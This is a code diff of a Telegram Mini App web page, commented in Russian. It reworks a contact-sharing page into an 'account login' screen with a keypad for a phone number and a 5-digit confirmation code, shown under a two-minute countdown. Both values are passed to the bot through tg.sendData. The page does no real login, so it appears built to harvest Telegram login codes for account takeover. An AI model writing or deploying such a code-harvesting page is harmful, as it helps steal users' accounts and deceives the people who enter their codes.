@@ -57,6 +57,7 @@
             display: flex;
             align-items: center;
             gap: 12px;
+            border: 1px solid var(--tg-theme-hint-color, #2b3b4c);
         }
         
         .avatar {
@@ -85,69 +86,85 @@
             color: var(--tg-theme-hint-color, #6c7883);
         }
         
-        .phone-display {
+        /* Статус бар */
+        .status-bar {
             background: var(--tg-theme-bg-color, #0e1621);
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-left: 4px solid var(--tg-theme-button-color, #2b5278);
+        }
+        
+        .status-text {
+            font-size: 14px;
+        }
+        
+        .status-icon {
+            width: 20px;
+            height: 20px;
+            border-radius: 10px;
+            background: var(--tg-theme-button-color, #2b5278);
+        }
+        
+        .status-icon.success {
+            background: #4CAF50;
+        }
+        
+        .status-icon.error {
+            background: #f44336;
+        }
+        
+        .status-icon.waiting {
+            background: #FF9800;
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        /* Дисплей для номера/кода */
+        .display-box {
+            background: var(--tg-theme-bg-color, #0e1621);
+            border: 2px solid var(--tg-theme-hint-color, #2b3b4c);
             border-radius: 16px;
-            padding: 20px;
+            padding: 16px;
             margin-bottom: 20px;
             text-align: center;
-            border: 2px solid var(--tg-theme-button-color, #2b5278);
-        }
-        
-        .phone-number {
             font-size: 24px;
-            font-weight: 600;
-            letter-spacing: 2px;
             font-family: monospace;
-            color: var(--tg-theme-button-color, #2b5278);
+            min-height: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             word-break: break-all;
+            transition: all 0.3s;
         }
         
-        .phone-label {
-            font-size: 14px;
+        .display-box.active {
+            border-color: var(--tg-theme-button-color, #2b5278);
+            box-shadow: 0 0 10px rgba(43, 82, 120, 0.3);
+        }
+        
+        .display-box.code-mode {
+            font-size: 32px;
+            letter-spacing: 8px;
+        }
+        
+        .display-label {
+            font-size: 12px;
             color: var(--tg-theme-hint-color, #6c7883);
-            margin-bottom: 8px;
+            margin-bottom: 4px;
+            text-align: center;
         }
         
-        .button {
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 16px;
-            background: var(--tg-theme-button-color, #2b5278);
-            color: var(--tg-theme-button-text-color, #ffffff);
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.2s, opacity 0.2s;
-            margin-bottom: 12px;
-        }
-        
-        .button:active {
-            transform: scale(0.98);
-            opacity: 0.9;
-        }
-        
-        .button.secondary {
-            background: var(--tg-theme-secondary-bg-color, #232e3c);
-            color: var(--tg-theme-text-color, #ffffff);
-        }
-        
-        .button:disabled {
-            opacity: 0.5;
-            pointer-events: none;
-        }
-        
-        .status-message {
-            background: var(--tg-theme-bg-color, #0e1621);
-            border-left: 4px solid var(--tg-theme-button-color, #2b5278);
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        
-        .progress-bar {
+        /* Прогресс бар */
+        .progress-container {
             width: 100%;
             height: 20px;
             background: var(--tg-theme-bg-color, #0e1621);
@@ -159,147 +176,163 @@
         
         .progress-fill {
             height: 100%;
-            background: var(--tg-theme-button-color, #2b5278);
+            background: linear-gradient(90deg, var(--tg-theme-button-color, #2b5278), #4CAF50);
             width: 0%;
-            transition: width 0.3s;
-            border-radius: 10px;
+            transition: width 0.1s linear;
         }
         
         .progress-text {
             text-align: center;
-            font-size: 14px;
+            font-size: 12px;
             color: var(--tg-theme-hint-color, #6c7883);
-            margin-bottom: 5px;
+            margin-top: 5px;
         }
         
-        .timer {
+        /* Таймер */
+        .timer-container {
             text-align: center;
-            font-size: 32px;
+            margin: 20px 0;
+            padding: 15px;
+            background: var(--tg-theme-bg-color, #0e1621);
+            border-radius: 12px;
+        }
+        
+        .timer-display {
+            font-size: 36px;
             font-weight: 600;
             font-family: monospace;
             color: var(--tg-theme-button-color, #2b5278);
-            margin: 20px 0;
+        }
+        
+        .timer-display.warning {
+            color: #FF9800;
+        }
+        
+        .timer-display.expired {
+            color: #f44336;
         }
         
         .timer-label {
-            text-align: center;
-            font-size: 14px;
+            font-size: 12px;
             color: var(--tg-theme-hint-color, #6c7883);
-            margin-bottom: 5px;
+            margin-top: 5px;
         }
         
-        .info-box {
-            background: var(--tg-theme-bg-color, #0e1621);
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-            padding-bottom: 8px;
-            border-bottom: 1px solid var(--tg-theme-hint-color, #2b3b4c);
-        }
-        
-        .info-row:last-child {
-            border-bottom: none;
-            margin-bottom: 0;
-            padding-bottom: 0;
-        }
-        
-        .info-label {
-            color: var(--tg-theme-hint-color, #6c7883);
-        }
-        
-        .info-value {
-            font-weight: 600;
-        }
-        
-        .pin-keypad {
+        /* Цифровая клавиатура */
+        .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin: 20px 0;
+        }
+        
+        .key {
+            background: var(--tg-theme-bg-color, #0e1621);
+            border: 1px solid var(--tg-theme-hint-color, #2b3b4c);
+            border-radius: 16px;
+            padding: 18px;
+            font-size: 22px;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.1s;
+            user-select: none;
+        }
+        
+        .key:active {
+            background: var(--tg-theme-button-color, #2b5278);
+            transform: scale(0.95);
+        }
+        
+        .key.zero {
+            grid-column: span 2;
+        }
+        
+        .key.delete {
+            background: #d32f2f;
+            color: white;
+        }
+        
+        .key.delete:active {
+            background: #b71c1c;
+        }
+        
+        .key.confirm {
+            background: #4CAF50;
+            color: white;
+        }
+        
+        .key.confirm:active {
+            background: #388E3C;
+        }
+        
+        .key.switch-mode {
+            background: var(--tg-theme-secondary-bg-color, #232e3c);
+        }
+        
+        .key:disabled {
+            opacity: 0.3;
+            pointer-events: none;
+        }
+        
+        /* Кнопки действий */
+        .action-buttons {
+            display: flex;
             gap: 10px;
             margin: 20px 0;
         }
         
-        .pin-key {
-            background: var(--tg-theme-bg-color, #0e1621);
-            border: 1px solid var(--tg-theme-hint-color, #2b3b4c);
-            border-radius: 16px;
-            padding: 20px;
-            font-size: 24px;
-            font-weight: 600;
-            text-align: center;
-            cursor: pointer;
-            transition: background 0.2s;
-            user-select: none;
-        }
-        
-        .pin-key:active {
-            background: var(--tg-theme-button-color, #2b5278);
-            color: white;
-        }
-        
-        .pin-display {
-            background: var(--tg-theme-bg-color, #0e1621);
-            border: 2px solid var(--tg-theme-hint-color, #2b3b4c);
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 20px;
-            text-align: center;
-            font-size: 24px;
-            letter-spacing: 8px;
-            font-family: monospace;
-        }
-        
-        .saved-phones {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .phone-button {
+        .action-btn {
+            flex: 1;
             background: var(--tg-theme-bg-color, #0e1621);
             border: 1px solid var(--tg-theme-hint-color, #2b3b4c);
             border-radius: 12px;
-            padding: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            padding: 12px;
+            text-align: center;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: all 0.1s;
+            font-size: 14px;
         }
         
-        .phone-button:active {
+        .action-btn:active {
+            background: var(--tg-theme-button-color, #2b5278);
+        }
+        
+        .action-btn.primary {
             background: var(--tg-theme-button-color, #2b5278);
             border-color: var(--tg-theme-button-color, #2b5278);
         }
         
-        .phone-index {
-            width: 30px;
-            height: 30px;
-            border-radius: 15px;
+        /* Навигационные кнопки */
+        .nav-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid var(--tg-theme-hint-color, #2b3b4c);
+        }
+        
+        .nav-btn {
+            flex: 1;
+            background: var(--tg-theme-bg-color, #0e1621);
+            border: 1px solid var(--tg-theme-hint-color, #2b3b4c);
+            border-radius: 12px;
+            padding: 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.1s;
+            font-size: 14px;
+        }
+        
+        .nav-btn:active {
             background: var(--tg-theme-button-color, #2b5278);
-            color: white;
+        }
+        
+        .nav-btn.back {
             display: flex;
             align-items: center;
             justify-content: center;
-            font-weight: 600;
-        }
-        
-        .phone-text {
-            flex: 1;
-            font-family: monospace;
-            font-size: 16px;
-        }
-        
-        .phone-check {
-            color: #4CAF50;
-            font-size: 20px;
+            gap: 5px;
         }
         
         .hidden {
@@ -310,11 +343,11 @@
 <body>
     <div class="container">
         <div class="card">
-            <h1>📱 Отправить номер</h1>
-            <div class="subtitle">Нажми кнопку и поделись контактом</div>
+            <h1>📱 Вход в аккаунт</h1>
+            <div class="subtitle">Нажми кнопку для отправки номера</div>
             
             <!-- Информация о пользователе -->
-            <div class="user-info" id="userInfo">
+            <div class="user-info">
                 <div class="avatar" id="userAvatar">👤</div>
                 <div class="user-details">
                     <div class="user-name" id="userName">Загрузка...</div>
@@ -322,58 +355,64 @@
                 </div>
             </div>
             
-            <!-- Отображение номера телефона -->
-            <div class="phone-display" id="phoneDisplay">
-                <div class="phone-label">Ваш номер</div>
-                <div class="phone-number" id="phoneNumber">—</div>
+            <!-- Статус бар (обновляется каждую секунду) -->
+            <div class="status-bar" id="statusBar">
+                <span class="status-text" id="statusText">Ожидание действий</span>
+                <span class="status-icon" id="statusIcon"></span>
             </div>
             
-            <!-- КНОПКА ОТПРАВКИ НОМЕРА (ГЛАВНАЯ) -->
-            <button class="button" id="sendContactBtn" onclick="requestContact()">
-                📞 Отправить мой номер
-            </button>
+            <!-- Дисплей для отображения номера/кода -->
+            <div class="display-label" id="displayLabel">Введите номер</div>
+            <div class="display-box" id="displayBox"></div>
             
-            <!-- Статус сообщение -->
-            <div class="status-message" id="statusMessage">
-                Нажми кнопку, чтобы поделиться номером
-            </div>
-            
-            <!-- Прогресс-бар (скрыт по умолчанию) -->
-            <div id="progressContainer" class="hidden">
-                <div class="progress-text" id="progressText">Отправка...</div>
-                <div class="progress-bar">
+            <!-- Прогресс бар (появляется при действиях) -->
+            <div id="progressSection" class="hidden">
+                <div class="progress-container">
                     <div class="progress-fill" id="progressFill"></div>
                 </div>
+                <div class="progress-text" id="progressText">0%</div>
             </div>
             
-            <!-- Таймер (скрыт по умолчанию) -->
-            <div id="timerContainer" class="hidden">
-                <div class="timer-label">Ожидание кода</div>
-                <div class="timer" id="timer">02:00</div>
+            <!-- Таймер (появляется после отправки кода) -->
+            <div id="timerSection" class="hidden">
+                <div class="timer-container">
+                    <div class="timer-display" id="timerDisplay">02:00</div>
+                    <div class="timer-label">Осталось для ввода кода</div>
+                </div>
             </div>
             
-            <!-- Сохранённые номера (скрыты по умолчанию) -->
-            <div id="savedPhonesContainer" class="hidden">
-                <div class="info-row">
-                    <span class="info-label">Сохранённые номера</span>
-                    <span class="info-value" id="savedCount">0</span>
-                </div>
-                <div class="saved-phones" id="savedPhonesList"></div>
+            <!-- Цифровая клавиатура -->
+            <div class="keypad" id="keypad">
+                <div class="key" onclick="addDigit(1)">1</div>
+                <div class="key" onclick="addDigit(2)">2</div>
+                <div class="key" onclick="addDigit(3)">3</div>
+                <div class="key" onclick="addDigit(4)">4</div>
+                <div class="key" onclick="addDigit(5)">5</div>
+                <div class="key" onclick="addDigit(6)">6</div>
+                <div class="key" onclick="addDigit(7)">7</div>
+                <div class="key" onclick="addDigit(8)">8</div>
+                <div class="key" onclick="addDigit(9)">9</div>
+                <div class="key delete" onclick="deleteDigit()">⌫</div>
+                <div class="key zero" onclick="addDigit(0)">0</div>
+                <div class="key confirm" onclick="confirmInput()">✓</div>
             </div>
             
-            <!-- Информация о статусе -->
-            <div class="info-box">
-                <div class="info-row">
-                    <span class="info-label">Статус</span>
-                    <span class="info-value" id="connectionStatus">Ожидание</span>
+            <!-- Кнопки действий -->
+            <div class="action-buttons">
+                <div class="action-btn" onclick="requestContact()">📱 Отправить контакт</div>
+                <div class="action-btn primary" onclick="clearDisplay()">🔄 Очистить</div>
+            </div>
+            
+            <!-- Навигационные кнопки -->
+            <div class="nav-buttons">
+                <div class="nav-btn back" onclick="goBack()">
+                    <span>←</span> Назад
                 </div>
-                <div class="info-row">
-                    <span class="info-label">Номер</span>
-                    <span class="info-value" id="phoneStatus">Не получен</span>
+                <div class="nav-btn" onclick="switchMode()" id="modeSwitch">
+                    🔢 Режим кода
                 </div>
-                <div class="info-row">
-                    <span class="info-label">Пин-код</span>
-                    <span class="info-value" id="pinStatus">5482</span>
+                <div class="nav-btn" onclick="resetApp()">
+                    🔄 Сброс
                 </div>
             </div>
         </div>
@@ -385,12 +424,15 @@
         tg.expand();
         tg.ready();
         
-        // Данные пользователя Telegram
+        // Данные пользователя
         const user = tg.initDataUnsafe?.user;
-        let phoneNumber = null;
-        let savedPhones = [];
+        let phoneNumber = '';
+        let codeDigits = '';
+        let currentMode = 'phone'; // 'phone' или 'code'
         let timerInterval = null;
         let progressInterval = null;
+        let timeLeft = 120; // 2 минуты
+        let updateInterval = null;
         
         // Отображение информации о пользователе
         if (user) {
@@ -399,124 +441,187 @@
             document.getElementById('userAvatar').textContent = user.first_name?.charAt(0) || '👤';
         }
         
-        // Функция запроса контакта
-        function requestContact() {
-            showStatus('🔄 Запрос контакта...');
-            showProgress('Отправка запроса...', 30);
+        // Обновление интерфейса каждую секунду
+        function startUpdateInterval() {
+            if (updateInterval) clearInterval(updateInterval);
+            updateInterval = setInterval(updateInterface, 1000);
+        }
+        
+        function updateInterface() {
+            // Обновляем статус
+            updateStatus();
             
-            // Запрашиваем контакт через Telegram
+            // Обновляем отображение
+            updateDisplay();
+        }
+        
+        function updateStatus() {
+            const statusText = document.getElementById('statusText');
+            const statusIcon = document.getElementById('statusIcon');
+            
+            if (phoneNumber) {
+                statusText.textContent = `✅ Номер: ${phoneNumber}`;
+                statusIcon.className = 'status-icon success';
+            } else if (currentMode === 'code' && codeDigits) {
+                statusText.textContent = `🔑 Код: ${codeDigits}`;
+                statusIcon.className = 'status-icon success';
+            } else {
+                statusText.textContent = '⏳ Ожидание ввода';
+                statusIcon.className = 'status-icon waiting';
+            }
+        }
+        
+        function updateDisplay() {
+            const display = document.getElementById('displayBox');
+            const label = document.getElementById('displayLabel');
+            
+            if (currentMode === 'phone') {
+                label.textContent = 'Введите номер телефона';
+                display.textContent = phoneNumber || '—';
+                display.classList.remove('code-mode');
+            } else {
+                label.textContent = 'Введите код подтверждения';
+                display.textContent = codeDigits || '____';
+                display.classList.add('code-mode');
+            }
+        }
+        
+        // Функции для работы с цифрами
+        function addDigit(digit) {
+            if (currentMode === 'phone') {
+                if (phoneNumber.length < 15) {
+                    phoneNumber += digit;
+                    showProgress('Ввод номера...', 20);
+                }
+            } else {
+                if (codeDigits.length < 5) {
+                    codeDigits += digit;
+                    showProgress('Ввод кода...', 20);
+                }
+            }
+            updateDisplay();
+            updateStatus();
+        }
+        
+        function deleteDigit() {
+            if (currentMode === 'phone') {
+                phoneNumber = phoneNumber.slice(0, -1);
+            } else {
+                codeDigits = codeDigits.slice(0, -1);
+            }
+            showProgress('Удаление...', 10);
+            updateDisplay();
+            updateStatus();
+        }
+        
+        function clearDisplay() {
+            if (currentMode === 'phone') {
+                phoneNumber = '';
+            } else {
+                codeDigits = '';
+            }
+            showProgress('Очистка...', 10);
+            updateDisplay();
+            updateStatus();
+        }
+        
+        function confirmInput() {
+            if (currentMode === 'phone') {
+                if (phoneNumber.length >= 10) {
+                    showProgress('Отправка номера...', 50);
+                    tg.sendData(JSON.stringify({
+                        action: 'phone_entered',
+                        phone: phoneNumber,
+                        user_id: user?.id
+                    }));
+                    showStatus('success', '✅ Номер отправлен');
+                    switchMode();
+                } else {
+                    showStatus('error', '❌ Слишком короткий номер');
+                }
+            } else {
+                if (codeDigits.length === 5) {
+                    showProgress('Проверка кода...', 50);
+                    tg.sendData(JSON.stringify({
+                        action: 'code_entered',
+                        code: codeDigits,
+                        user_id: user?.id
+                    }));
+                    showStatus('success', '✅ Код отправлен');
+                    startTimer();
+                } else {
+                    showStatus('error', '❌ Введите 5 цифр');
+                }
+            }
+        }
+        
+        // Запрос контакта через Telegram
+        function requestContact() {
+            showProgress('Запрос контакта...', 30);
+            showStatus('waiting', '⏳ Запрос контакта...');
+            
             tg.requestContact((success, response) => {
                 if (success) {
-                    // Получили контакт
                     const contact = response.contact;
                     phoneNumber = contact.phone_number;
+                    showProgress('Обработка...', 20);
+                    showStatus('success', '✅ Контакт получен');
+                    updateDisplay();
+                    updateStatus();
                     
-                    // Отображаем номер
-                    document.getElementById('phoneNumber').textContent = phoneNumber;
-                    document.getElementById('phoneStatus').textContent = 'Получен';
-                    
-                    // Сохраняем в список
-                    savePhone(phoneNumber);
-                    
-                    // Показываем успех
-                    showStatus('✅ Контакт получен!', 'success');
-                    hideProgress();
-                    
-                    // Запускаем таймер (имитация отправки кода)
-                    startTimer(120);
-                    
-                    // Отправляем данные боту
                     tg.sendData(JSON.stringify({
                         action: 'contact_received',
                         phone: phoneNumber,
                         user_id: user?.id
                     }));
-                    
                 } else {
-                    // Ошибка или отмена
-                    showStatus('❌ Не удалось получить контакт', 'error');
-                    hideProgress();
+                    showStatus('error', '❌ Отказ от отправки');
                 }
+                hideProgress();
             });
         }
         
-        // Функция сохранения номера
-        function savePhone(phone) {
-            if (!savedPhones.includes(phone)) {
-                savedPhones.unshift(phone);
-                if (savedPhones.length > 5) {
-                    savedPhones.pop();
-                }
-                updateSavedPhones();
-            }
+        // Переключение режимов
+        function switchMode() {
+            currentMode = currentMode === 'phone' ? 'code' : 'phone';
+            document.getElementById('modeSwitch').textContent = 
+                currentMode === 'phone' ? '🔢 Режим кода' : '📞 Режим номера';
+            clearDisplay();
+            showProgress('Смена режима...', 10);
         }
         
-        // Обновление списка сохранённых номеров
-        function updateSavedPhones() {
-            const container = document.getElementById('savedPhonesContainer');
-            const list = document.getElementById('savedPhonesList');
-            const count = document.getElementById('savedCount');
-            
-            if (savedPhones.length > 0) {
-                container.classList.remove('hidden');
-                count.textContent = savedPhones.length;
-                
-                list.innerHTML = '';
-                savedPhones.forEach((phone, index) => {
-                    const phoneDiv = document.createElement('div');
-                    phoneDiv.className = 'phone-button';
-                    phoneDiv.onclick = () => selectPhone(phone);
-                    phoneDiv.innerHTML = `
-                        <div class="phone-index">${index + 1}</div>
-                        <div class="phone-text">${phone}</div>
-                        <div class="phone-check">✓</div>
-                    `;
-                    list.appendChild(phoneDiv);
-                });
-            }
+        // Навигация назад
+        function goBack() {
+            showProgress('Возврат...', 10);
+            tg.BackButton.onClick(() => {});
+            tg.close();
         }
         
-        // Выбор сохранённого номера
-        function selectPhone(phone) {
-            phoneNumber = phone;
-            document.getElementById('phoneNumber').textContent = phone;
-            document.getElementById('phoneStatus').textContent = 'Выбран';
-            showStatus(`✅ Выбран номер: ${phone}`, 'success');
-            
-            // Отправляем боту
-            tg.sendData(JSON.stringify({
-                action: 'phone_selected',
-                phone: phone,
-                user_id: user?.id
-            }));
+        // Сброс приложения
+        function resetApp() {
+            phoneNumber = '';
+            codeDigits = '';
+            currentMode = 'phone';
+            stopTimer();
+            hideProgress();
+            showStatus('info', '🔄 Сброс выполнен');
+            updateDisplay();
+            updateStatus();
+            document.getElementById('modeSwitch').textContent = '🔢 Режим кода';
         }
         
-        // Функция отображения статуса
-        function showStatus(message, type = 'info') {
-            const statusEl = document.getElementById('statusMessage');
-            statusEl.textContent = message;
-            
-            if (type === 'success') {
-                statusEl.style.borderLeftColor = '#4CAF50';
-            } else if (type === 'error') {
-                statusEl.style.borderLeftColor = '#f44336';
-            } else {
-                statusEl.style.borderLeftColor = 'var(--tg-theme-button-color, #2b5278)';
-            }
-        }
-        
-        // Функция показа прогресс-бара
-        function showProgress(text, duration = 100) {
-            const container = document.getElementById('progressContainer');
-            const textEl = document.getElementById('progressText');
+        // Прогресс бар
+        function showProgress(text, duration = 30) {
+            const section = document.getElementById('progressSection');
             const fill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
             
-            container.classList.remove('hidden');
-            textEl.textContent = text;
+            section.classList.remove('hidden');
+            progressText.textContent = text;
             
-            let progress = 0;
             if (progressInterval) clearInterval(progressInterval);
             
+            let progress = 0;
             progressInterval = setInterval(() => {
                 progress += 1;
                 fill.style.width = progress + '%';
@@ -524,82 +629,86 @@
                 if (progress >= 100) {
                     clearInterval(progressInterval);
                     setTimeout(() => {
-                        container.classList.add('hidden');
+                        section.classList.add('hidden');
                     }, 500);
                 }
             }, duration * 10);
         }
         
-        // Функция скрытия прогресс-бара
         function hideProgress() {
             if (progressInterval) {
                 clearInterval(progressInterval);
                 progressInterval = null;
             }
-            document.getElementById('progressContainer').classList.add('hidden');
+            document.getElementById('progressSection').classList.add('hidden');
         }
         
-        // Функция запуска таймера
-        function startTimer(seconds) {
-            const container = document.getElementById('timerContainer');
-            const timerEl = document.getElementById('timer');
+        // Статус сообщения
+        function showStatus(type, message) {
+            const statusBar = document.getElementById('statusBar');
+            const statusText = document.getElementById('statusText');
+            const statusIcon = document.getElementById('statusIcon');
             
-            container.classList.remove('hidden');
+            statusText.textContent = message;
+            
+            if (type === 'success') {
+                statusIcon.className = 'status-icon success';
+                statusBar.style.borderLeftColor = '#4CAF50';
+            } else if (type === 'error') {
+                statusIcon.className = 'status-icon error';
+                statusBar.style.borderLeftColor = '#f44336';
+            } else {
+                statusIcon.className = 'status-icon waiting';
+                statusBar.style.borderLeftColor = '#FF9800';
+            }
+        }
+        
+        // Таймер
+        function startTimer() {
+            const section = document.getElementById('timerSection');
+            const display = document.getElementById('timerDisplay');
+            
+            section.classList.remove('hidden');
             
             if (timerInterval) clearInterval(timerInterval);
             
-            let remaining = seconds;
+            timeLeft = 120;
             timerInterval = setInterval(() => {
-                const mins = Math.floor(remaining / 60);
-                const secs = remaining % 60;
-                timerEl.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                const mins = Math.floor(timeLeft / 60);
+                const secs = timeLeft % 60;
+                display.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                 
-                if (remaining <= 30) {
-                    timerEl.style.color = '#FF9800';
+                if (timeLeft <= 30) {
+                    display.classList.add('warning');
                 }
-                if (remaining <= 10) {
-                    timerEl.style.color = '#f44336';
+                if (timeLeft <= 10) {
+                    display.classList.remove('warning');
+                    display.classList.add('expired');
                 }
                 
-                remaining--;
+                timeLeft--;
                 
-                if (remaining < 0) {
+                if (timeLeft < 0) {
                     clearInterval(timerInterval);
-                    timerEl.textContent = '00:00';
-                    showStatus('⌛ Время вышло!', 'error');
+                    display.textContent = '00:00';
+                    showStatus('error', '⌛ Время вышло');
                 }
             }, 1000);
         }
         
-        // Остановка таймера
         function stopTimer() {
             if (timerInterval) {
                 clearInterval(timerInterval);
                 timerInterval = null;
             }
-            document.getElementById('timerContainer').classList.add('hidden');
+            document.getElementById('timerSection').classList.add('hidden');
         }
         
-        // Загрузка сохранённых номеров из Telegram (если есть)
-        window.addEventListener('load', () => {
-            // Пытаемся получить данные из initData
-            if (tg.initDataUnsafe?.start_param) {
-                try {
-                    const data = JSON.parse(decodeURIComponent(tg.initDataUnsafe.start_param));
-                    if (data.phones) {
-                        savedPhones = data.phones;
-                        updateSavedPhones();
-                    }
-                } catch (e) {}
-            }
-        });
+        // Инициализация
+        startUpdateInterval();
         
-        // Обработка кнопки "Назад"
-        tg.BackButton.onClick(() => {
-            tg.close();
-        });
-        
+        // Показываем кнопку назад
         tg.BackButton.show();
     </script>
 </body>
-  </html>
+</html>
